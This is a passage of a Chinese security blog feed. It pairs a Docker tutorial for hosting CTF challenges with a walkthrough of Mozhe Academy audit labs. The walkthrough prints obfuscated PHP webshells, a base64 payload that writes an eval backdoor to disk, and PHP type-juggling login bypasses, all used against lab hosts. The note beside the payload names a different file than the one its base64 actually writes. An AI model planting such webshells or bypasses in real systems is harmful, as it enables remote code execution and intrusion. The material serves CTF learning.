    <content type="html"><![CDATA[<h1 id="docker复现ctf-amp-dockerfile编写ctf环境"><a href="#docker复现ctf-amp-dockerfile编写ctf环境" class="headerlink" title="docker复现ctf&amp;dockerfile编写ctf环境"></a>docker复现ctf&amp;dockerfile编写ctf环境</h1><p>author：Bigbroke  </p><p>出题以及复现经常要使用docker，以前学习的不系统，从头学习记录，备忘一下</p><h2 id="0x00-基本概念"><a href="#0x00-基本概念" class="headerlink" title="0x00 基本概念"></a>0x00 基本概念</h2><p>Docker 包括三个基本概念</p><ul><li>镜像（<code>Image</code>）</li><li>容器（<code>Container</code>）</li><li>仓库（<code>Repository</code>）</li></ul><h2 id="0x01使用镜像"><a href="#0x01使用镜像" class="headerlink" title="0x01使用镜像"></a>0x01使用镜像</h2><h3 id="1-1获取镜像"><a href="#1-1获取镜像" class="headerlink" title="1.1获取镜像"></a>1.1获取镜像</h3><p>docker pull ubuntu:16.04</p><pre><code class="bash">docker run -it ubuntu:16.04 bash</code></pre><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>bash</code>：放在镜像名后的是<strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li><li><code>exit</code> 退出了这个容器。</li></ul><h3 id="1-2搜寻镜像"><a href="#1-2搜寻镜像" class="headerlink" title="1.2搜寻镜像"></a>1.2搜寻镜像</h3><pre><code>docker search ctf</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301113_804.png" alt=""></p><h3 id="1-3列出镜像"><a href="#1-3列出镜像" class="headerlink" title="1.3列出镜像"></a>1.3列出镜像</h3><pre><code class="bash">docker images == docker image ls</code></pre><p>使用tag添加镜像标签</p><pre><code class="bash">docker tag ubuntu:latest CTF:latest</code></pre><h3 id="1-4中间层镜像"><a href="#1-4中间层镜像" class="headerlink" title="1.4中间层镜像"></a>1.4中间层镜像</h3><pre><code class="bash">$ docker image ls -a</code></pre><p>只列出ubuntu的</p><pre><code class="bash">docker image ls ubuntu</code></pre><p>列出特定的某个镜像，也就是说指定仓库名和标签</p><pre><code class="bash">$ docker image ls ubuntu:16.04</code></pre><h3 id="1-5-删除本地镜像"><a href="#1-5-删除本地镜像" class="headerlink" title="1.5 删除本地镜像"></a>1.5 删除本地镜像</h3><h4 id="使用标签删除镜像"><a href="#使用标签删除镜像" class="headerlink" title="使用标签删除镜像"></a>使用标签删除镜像</h4><p>docker rmi myubuntu:latest</p><p>docker rmi 命令只是删除镜像多个标签中的指定标签而已， 并不影响镜像文件，但是镜像只剩下一个标签的时候要注意 再使用docker rmi命令会彻底删除镜像</p><p>强行删除</p><p>docker rmi -f ubuntu:16.04</p><p>docker rmi id</p><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><pre><code class="bash">docker image rm  【image id】</code></pre><h3 id="1-6-commit"><a href="#1-6-commit" class="headerlink" title="1.6  commit"></a>1.6  commit</h3><p>Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</p><p><code>docker commit</code> 的语法格式为：</p><pre><code class="bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre><p>使用history查看镜像历史</p><pre><code class="bash">docker history ubuntu:16.04</code></pre><p>新的镜像定制好后，我们可以来运行这个镜像。</p><pre><code class="bash">docker run --name web2 -d -p 81:80 nginx:v2</code></pre><h3 id="1-7-上传镜像"><a href="#1-7-上传镜像" class="headerlink" title="1.7 上传镜像"></a>1.7 上传镜像</h3><p>docker tag test:latest user/test:latest</p><p>docker push user/test:latest</p><h2 id="0x02-操作镜像"><a href="#0x02-操作镜像" class="headerlink" title="0x02 操作镜像"></a>0x02 操作镜像</h2><h3 id="2-1创建镜像"><a href="#2-1创建镜像" class="headerlink" title="2.1创建镜像"></a>2.1创建镜像</h3><p>docker create -it ubuntu:latests</p><p>docker start af</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><h4 id="守护态："><a href="#守护态：" class="headerlink" title="守护态："></a>守护态：</h4><pre><code>  docker run -d --name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</code></pre><p>如果使用了 <code>-d</code> 参数运行容器。此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止的容器启动运行。</p><h3 id="2-2-终止容器"><a href="#2-2-终止容器" class="headerlink" title="2.2 终止容器"></a>2.2 终止容器</h3><p>docker stop ce5</p><p>docker start ce5 重启</p><p>通过 <code>docker container ls</code> 命令来查看容器信息。</p><pre><code>$ docker container ls -a</code></pre><h3 id="2-3-进入容器"><a href="#2-3-进入容器" class="headerlink" title="2.3 进入容器"></a>2.3 进入容器</h3><h4 id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h4><p><code>docker attach</code> 是 Docker 自带的命令。下面示例如何使用该命令。</p><pre><code class="bash">$ docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES243c32535da7        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           nostalgic_hypatia$ docker attach 243croot@243c32535da7:/#</code></pre><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h4 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h4><p>-i -t 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><pre><code class="bash">$ docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6$ docker container lsCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES69d137adef7a        ubuntu:latest       &quot;/bin/bash&quot;         18 seconds ago      Up 17 seconds                           zealous_swirles$ docker exec -i 69d1 bash</code></pre><h3 id="2-4导出容器"><a href="#2-4导出容器" class="headerlink" title="2.4导出容器"></a>2.4导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><pre><code class="bash">$ docker container ls -aCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES7691a814370e        ubuntu:14.04        &quot;/bin/bash&quot;         36 hours ago        Exited (0) 21 hours ago                       test$ docker export 7691a814370e &gt; ubuntu.tar</code></pre><p>这样将导出容器快照到本地文件。</p><h3 id="2-5导入容器快照"><a href="#2-5导入容器快照" class="headerlink" title="2.5导入容器快照"></a>2.5导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><pre><code class="bash">$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZEtest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</code></pre><h3 id="2-6删除容器"><a href="#2-6删除容器" class="headerlink" title="2.6删除容器"></a>2.6删除容器</h3><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><pre><code class="bash">$ docker container rm id</code></pre><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h2 id="0x03-dockerfile"><a href="#0x03-dockerfile" class="headerlink" title="0x03 dockerfile"></a>0x03 dockerfile</h2><h3 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h3><pre><code>FROM node:8.4：该 image 文件继承官方的 node image，冒号表示标签，这里标签是8.4，即8.4版本的 node。COPY .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。WORKDIR [directory]：指定接下来的工作路径为 directory。RUN [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。CMD [cmd]：在容器启动后自动执行 [cmd] 命令</code></pre><blockquote><pre><code class="bash">FROM node:8.4COPY . /appWORKDIR /appRUN npm install --registry=https://registry.npm.taobao.orgEXPOSE 3000</code></pre></blockquote><p>上面代码一共五行，含义如下。</p><blockquote><ul><li><code>FROM node:8.4</code>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<code>8.4</code>，即8.4版本的 node。</li><li><code>COPY . /app</code>：将当前目录下的所有文件（除了<code>.dockerignore</code>排除的路径），都拷贝进入 image 文件的<code>/app</code>目录。</li><li><code>WORKDIR /app</code>：指定接下来的工作路径为<code>/app</code>。</li><li><code>RUN npm install</code>：在<code>/app</code>目录下，运行<code>npm install</code>命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</li><li><code>EXPOSE 3000</code>：将容器 3000 端口暴露出来， 允许外部连接这个端口。</li></ul></blockquote><h3 id="创建image文件"><a href="#创建image文件" class="headerlink" title="创建image文件"></a>创建image文件</h3><pre><code> docker image build -t myctf .docker build - &lt; Dockerfile</code></pre><p><code>-t</code>用来指定 image 文件的名字，后面还可用冒号指定标签，如果不指定，则默认为<code>latest</code>，</p><h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p><code>docker container run</code> 命令会从 image 文件生成容器。</p><pre><code class="shell"> docker container run -p [port_local本地端口]:[port_container容器端口] -it image_name /bin/bash  docker container run -p 8000:3000 -it koa-demo /bin/bash   这就是在容器离得3000端口映射到本地8000端口 访问本机的8000端口就可以查看</code></pre><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>cd 到dockerfile存在的文件下</p><p> sudo docker build -t phplfi:v1 .</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_839.png" alt=""></p><p> sudo docker images</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301726_49.png" alt=""></p><p>sudo docker run -d -p 2333:80 phplfi:v1</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301727_684.png" alt=""></p><p>sudo docker run -it phplfi /bin/bash</p><h2 id="0x04-容器文件"><a href="#0x04-容器文件" class="headerlink" title="0x04 容器文件"></a>0x04 容器文件</h2><p>image 文件生成的容器实例，本身也是一个文件，称为容器文件。</p><pre><code># 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 移除不需要的容器文件$ docker container rm [containerID]# 容器中止后自动删除容器文件$ docker container run --rm -p 8000:3000 -it image-file /bin/bash</code></pre><h2 id="0x05-网络配置"><a href="#0x05-网络配置" class="headerlink" title="0x05 网络配置"></a>0x05 网络配置</h2><h3 id="5-1映射容器端口到宿主主机的实现"><a href="#5-1映射容器端口到宿主主机的实现" class="headerlink" title="5.1映射容器端口到宿主主机的实现"></a>5.1映射容器端口到宿主主机的实现</h3><p>容器允许外部访问，可以在 <code>docker run</code> 时候通过 <code>-p</code> 或 <code>-P</code> 参数来启用。</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>自动分配一个端口</p><p>docker run -it –name dedefun -p 0.0.0.0::8080 dedefun:latest /bin/bash</p><h2 id="0x06-docker命令补齐"><a href="#0x06-docker命令补齐" class="headerlink" title="0x06 docker命令补齐"></a>0x06 docker命令补齐</h2><p>执行<code>source xxx</code>命令，先执行<code>source /usr/share/bash-completion/completions/docker</code>，再输入<code>docker</code>，然后按2次Tab键，提示错误如下：</p><pre><code class="bash">docker bash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expectedbash: _get_comp_words_by_ref: command not foundbash: [: : integer expression expectedbash: [: : integer expression expectedbash: [: : integer expression expected</code></pre><p>注：第一行的docker，实际是输入的命令，其它是按Tab键的输出信息。</p><p>前面已经安装了<code>bash_completion</code>，于是想到执行</p><pre><code>source /usr/share/bash-completion/bash_completion</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301547_621.png" alt=""></p><h2 id="0x06-复现柠檬牛ctf"><a href="#0x06-复现柠檬牛ctf" class="headerlink" title="0x06 复现柠檬牛ctf"></a>0x06 复现柠檬牛ctf</h2><p>git clone <a href="https://github.com/l3m0n/My_CTF_Challenges.git" target="_blank" rel="external">https://github.com/l3m0n/My_CTF_Challenges.git</a></p><p>cd My_CTF_Challenges </p><p>cd </p><p>docker build -t dedefun ./</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>curl 127.0.0.1</p><p>cd  var/www/html </p><p>发现只有index.html  就运行下start.sh</p><p>./start.sh</p><p>退出 exit或者 ctrl +d</p><pre><code class="bash"> docker image ls</code></pre><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808202019_416.png" alt=""></p><h2 id="好文：Docker容器的创建、启动、和停止"><a href="#好文：Docker容器的创建、启动、和停止" class="headerlink" title="好文：Docker容器的创建、启动、和停止"></a>好文：<a href="https://www.cnblogs.com/linjiqin/p/8608975.html" target="_blank" rel="external">Docker容器的创建、启动、和停止</a></h2><p>1、容器是独立运行的一个或一组应用，及他们的运行环境。容器是Docker中的一个重要的概念。</p><p><strong>2、docker容器的启动有三种方式</strong><br>a.交互方式，基于镜像新建容器并启动<br>例如我们可以启动一个容器，打印出当前的日历表<br>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 cal ##my/python:v1为镜像名和标签<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141006656-1163681357.png" alt="img"></p><p>我们还可以通过指定参数，启动一个bash交互终端。<br>[root@rocketmq-nameserver4 ~]# docker run -it my/python:v1 /bin/bash<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141018576-2113140501.png" alt="img"><br>参数-t让Docker分配一个伪终端并绑定在容器的标准输入上，-i让容器的标准输入保持打开。</p><p>使用docker run命令来启动容器，docker在后台运行的标准操作包括<br>1.检查本地是否存在指定的镜像，不存在则从公有仓库下载<br>2.使用镜像创建并启动容器<br>3.分配一个文件系统，并在只读的镜像层外面挂载一层可读可写层<br>4.从宿主主机配置的网桥接口中桥接一个虚拟接口道容器中去<br>5.从地址池分配一个ip地址给容器<br>6.执行用户指定的应用程序<br>7.执行完毕之后容器被终止<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141029918-349771940.png" alt="img"><br>my/sinatra:v2基于training/sinatra镜像进行修改后的镜像，training/sinatra为公有仓库上的镜像。</p><p>b、短暂方式，直接将一个已经终止的容器启动运行起来<br>可以使用docker start命令，直接将一个已经终止的容器启动运行起来。</p><p>[root@rocketmq-nameserver4 ~]# docker run my/python:v1 /bin/echo hello test<br>hello test<br>命令执行完，控制台会打印”hello test”，container就终止了，不过并没有消失，<br>可以用”docker ps -n 5 “看一下最新前5个的container，第一个就是刚刚执行过的container，可以再次执行一遍：docker start container_id</p><p>不过这次控制台看不到”hello test”了，只能看到ID，用logs命令才能看得到：docker logs container_id。<br>可以看到两个”hello test”了，因为这个container运行了两次。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141043102-2077108773.png" alt="img"></p><p>c、daemon方式，守护态运行<br>即让软件作为长时间服务运行，这就是SAAS啊！</p><p>例如我们启动centos后台容器，每隔一秒打印当天的日历。<br>$ docker run -d centos /bin/sh -c “while true;do echo hello docker;sleep 1;done”</p><p>启动之后，我们使用docker ps -n 5查看容器的信息</p><p>要查看启动的centos容器中的输出，可以使用如下方式：<br>$ docker logs $CONTAINER_ID ##在container外面查看它的输出<br>$ docker attach $CONTAINER_ID ##连接上容器实时查看：</p><p><strong>3、终止容器</strong><br>使用docker stop $CONTAINER_ID来终止一个运行中的容器。并且可以使用docker ps -a来看终止状态的容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141055377-965119728.png" alt="img"></p><p>终止状态的容器，可以使用docker start来重新启动。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141106848-1725632174.png" alt="img"></p><p>使用docker restart命令来重启一个容器。<br><img src="https://images2018.cnblogs.com/blog/270324/201803/270324-20180320141119426-840453652.png" alt="img"></p><p>invalid argument “Mysqlonline” for t: Error parsing reference: “Mysqlonline” is not a valid repository/tag: repository name must be lowercase See ‘docker build –help’.</p><p>原因真正原因是名称中带了大写的M O，将大写改为小写，创建成功。</p><p>坑啊，文档中并没有哪里要求只能是小写。</p><p>docker run -it –name mysqlonline -p 0.0.0.0:8080:80  mysqlonline:latest /bin/bash</p><p>sudo apt install curl</p><p>xftp<br>  202  ls<br>  203  cd geekweb1/<br>  204  clear<br>  205  ls<br>  206  pwd<br>  207  docker build -t tset/img /root/geekweb1<br>  208  docker images<br>  209  docker rmi c8daa6cadc73<br>  210  doker stop 036d7eabaf2e<br>  211  docker 036d7eabaf2e<br>  212  docker stop 036d7eabaf2e<br>  213  docker rm 036d7eabaf2e<br>  214  docker rmi c8daa6cadc73<br>  215  lsa<br>  216  cd ..<br>  217  ls<br>  218  rm -rf geekweb1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;docker复现ctf-amp-dockerfile编写ctf环境&quot;&gt;&lt;a href=&quot;#docker复现ctf-amp-dockerfile编写ctf环境&quot; class=&quot;headerlink&quot; title=&quot;docker复现ctf&amp;amp;dockerfile
      
    
    </summary>
    
      <category term="工具" scheme="http://Bigbroke.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="docker" scheme="http://Bigbroke.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院审计类通关指南</title>
    <link href="http://Bigbroke.com/archis/441c37c9/"/>
    <id>http://Bigbroke.com/archis/441c37c9/</id>
    <published>2018-10-28T14:02:08.000Z</published>
    <updated>2018-11-02T13:52:16.692Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/2821" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><h2 id="一、PHP代码分析溯源"><a href="#一、PHP代码分析溯源" class="headerlink" title="一、PHP代码分析溯源"></a>一、PHP代码分析溯源</h2><h3 id="0x00-第1题"><a href="#0x00-第1题" class="headerlink" title="0x00 第1题"></a>0x00 第1题</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>访问<a href="http://219.153.49.228:42335/" target="_blank" rel="external">http://219.153.49.228:42335/</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291012_99.png" alt=""></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>分析代码：</p><p>我们用echo分别输出三个变量</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291020_69.png" alt=""></p><p><code>&quot;$_&quot;     &quot;$__&quot;     &quot;$___&quot;</code> 这三个是变量名，我们通过编译知道它们分别是：</p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>实际上去理解“^”为异或运算符，$<em>++;这行代码的意思是对变量名为”</em>“的变量进行自增操作，可以发现是异曲同工之妙</p><pre><code>$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);(&quot;`&quot;^&quot;?&quot;)       01100000^00111111=01011111 —&gt;”_”(&quot;:&quot;^&quot;}&quot;)        00111010^01111101=01000111—&gt;”G”(&quot;%&quot;^&quot;`&quot;)      00100101^01100000=01000101—&gt;”E”(&quot;{&quot;^&quot;/&quot;)        01111011^ 00101111=01010100—&gt;”T”</code></pre><p>我们把变量用值替换进去得到</p><p> <code>${_GET}[!1](${_POST}[1]);</code>，把多余的{}去掉 [!1]也就是[0]</p><p>整理后代码如下： <code>$_GET[0]($_POST[1]);</code>和一句话的 <code>$_POST[1]</code>传参差不多了，那么<code>$_GET[0]</code>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:42335/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert</a></p><p>1=phpinfo()</p><p>可以执行</p><p>菜刀写入<a href="http://219.153.49.228:42335/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=assert密码是1</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291026_279.png" alt=""></p><p>mozheae74b8ee177abe3a37432f933ac</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:42335/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:42335/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote><h3 id="0x01-第二题"><a href="#0x01-第二题" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>根据提供的源代码，分析找出认证码，审计源代码，需要找一个值，这个值的md5值在php中==题中给定值的md5值</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290917_642.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0);$a1 = md5(&#39;QNKCDZO&#39;);$a = @$_POST[&#39;pass&#39;];$a2 = @md5($a);if(isset($a)){    if ($a != &#39;QNKCDZO&#39; &amp;&amp; $a1 == $a2) {        /**        内容省略！         **/        exit();    } else {        echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;    }}?&gt;</code></pre><p>这里有很明显的问题，密码是以MD5方式保存，只要找到一个QNKCDZO的md5值相同的密码就可以通过，或者php是弱类型语言，在使用 == 号时，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p><pre><code>md5(&#39;240610708&#39;) 的结果是：0e462097431906509019562988736854md5(&#39;QNKCDZO&#39;) 的结果是：0e830400451993494058024219903391</code></pre><p> 0e 的科学记数法开头，字符串被隐式转换为浮点数，实际上也就等效于 0，所以为0，相等。</p><p>输入240610708</p><p>KEY:<br>mozhe454234355b0307eea24ed161701</p><h3 id="0x02-第三题"><a href="#0x02-第三题" class="headerlink" title="0x02 第三题"></a>0x02 第三题</h3><h4 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h4><p>某公司雇佣你对一个登陆界面进行测试，你只能得到源码，需要审计这段源码，找出其漏洞并成功登陆</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290930_375.png" alt=""></p><p>下载源代码，审计</p><pre><code class="php">&lt;?phperror_reporting(0); function noother_says_correct($number) {     $one = ord(&#39;1&#39;);     $nine = ord(&#39;9&#39;);     for ($i = 0; $i &lt; strlen($number); $i++)     {         $digit = ord($number{$i});         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )         {             return false;         }     }     return $number == &#39;54975581388&#39;; }if(noother_says_correct($_POST[&#39;pass&#39;])){    /**    此处省略     **/} else{    echo &#39;&lt;script&gt;alert(\&#39;认证错误\&#39;);window.location.href=\&#39;/index.html\&#39;;&lt;/script&gt;&#39;;}?&gt;</code></pre><p>分析代码：</p><p>1.在for 循环中是判断输入的字符是否有存在在1和9之间的数字</p><p>2.如果不存在判断是否等于54975581388</p><p>3.等于就可以绕过</p><p>4..php弱类型考点<code>$a == $b</code>等于<strong>TRUE</strong> 如果类型转换后<code>$a</code>等于<code>$b</code>，php在转码时会把16进制转化为十进制，将54975581388转成16进制，0xccccccccc。</p><p>KEY: mozhe8466fa038dd9ad4c4934892d6b7</p><h2 id="二、WebShell代码分析溯源全解析"><a href="#二、WebShell代码分析溯源全解析" class="headerlink" title="二、WebShell代码分析溯源全解析"></a>二、WebShell代码分析溯源全解析</h2><h3 id="0x00-第一题"><a href="#0x00-第一题" class="headerlink" title="0x00 第一题"></a>0x00 第一题</h3><h4 id="背景-3"><a href="#背景-3" class="headerlink" title="背景"></a>背景</h4><p>某系统环境上发现一个可疑文件，请协助运维人员分析此文件的功能。</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271427_84.png" alt=""></p><p> 下载系统源码 ，发现在cn-right.php文件中存在webshell</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809271435_300.png" alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$_GET[&#39;POST&#39;]($_POST[&#39;GET&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码，用GET和POST函数就构成了木马，</p><p>方法一：</p><p><a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p>GET=${fputs(fopen(base64_decode(bWFuZzAucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWydtYW5nMCddKTsgPz4=))}</p><p>执行后当前目录生成Bigbroke.php一句话木马，密码为 Bigbroke</p><p>方法二：</p><p>客户端用菜刀，密码GET，url为<a href="http://219.153.49.228:40568/www/cn-right.php?POST=assert" target="_blank" rel="external">http://219.153.49.228:40568/www/cn-right.php?POST=assert</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809291005_963.png" alt=""></p><p>mozhe3dbde397de25960e10f5d997a47</p><h3 id="0x01-第二题-1"><a href="#0x01-第二题-1" class="headerlink" title="0x01 第二题"></a>0x01 第二题</h3><h4 id="背景-4"><a href="#背景-4" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281233_867.png" alt=""></p><p>下载系统源码，在index.php存在恶意代码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281248_425.png" alt=""></p><pre><code class="php">&lt;?php     $POST[&#39;POST&#39;]=&#39;assert&#39;;    $array[]=$POST;    $array[0][&#39;POST&#39;]($_POST[&#39;assert&#39;]);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>assert，是php代码执行函数，与eval()有同样的功能，因为<code>$array[],POST[]</code>都是数组，所以<code>$array[]=$POST</code>，就是把<code>$POST</code>数组的值赋给<code>$array</code>数组，这样的话<code>$array[0][&#39;POST&#39;]</code>的输出就是assert，所以组成了一句话木马<code>&lt;?php assert($_POST[&#39;assert&#39;]);?&gt;</code>直接用菜刀链接即可密码为assert。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_877.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281310_426.png" 